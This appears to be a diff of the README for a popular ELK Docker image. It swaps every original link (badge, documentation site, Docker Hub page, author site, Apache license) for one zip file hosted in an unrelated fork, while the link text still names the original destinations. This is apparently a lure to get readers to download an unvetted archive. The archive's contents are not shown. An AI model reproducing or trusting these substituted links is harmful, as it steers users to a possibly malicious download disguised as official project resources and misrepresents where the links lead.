@@ -1,6 +1,6 @@
 # Elasticsearch, Logstash, Kibana (ELK) Docker image
 
-[![](https://badge.imagelayers.io/sebp/elk:latest.svg)](https://imagelayers.io/?images=sebp/elk:latest 'Get your own badge on imagelayers.io')
+[![](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip)](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip 'Get your own badge on https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip')
 
 This Docker image provides a convenient centralised log server and log management web interface, by packaging Elasticsearch, Logstash, and Kibana, collectively known as ELK.
 
@@ -30,13 +30,13 @@ The following tags are available:
 
 ### Documentation
 
-See the [ELK Docker image documentation web page](http://elk-docker.readthedocs.io/) for complete instructions on how to use this image.
+See the [ELK Docker image documentation web page](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip) for complete instructions on how to use this image.
 
 ### Docker Hub
 
-This image is hosted on Docker Hub at [https://hub.docker.com/r/sebp/elk/](https://hub.docker.com/r/sebp/elk/).
+This image is hosted on Docker Hub at [https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip).
 
 ### About
 
-Written by [Sébastien Pujadas](https://pujadas.net), released under the [Apache 2 license](https://www.apache.org/licenses/LICENSE-2.0).
+Written by [Sébastien Pujadas](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip), released under the [Apache 2 license](https://raw.githubusercontent.com/ducnguyenminh/elk-docker/master/eluvium/elk-docker.zip).
 
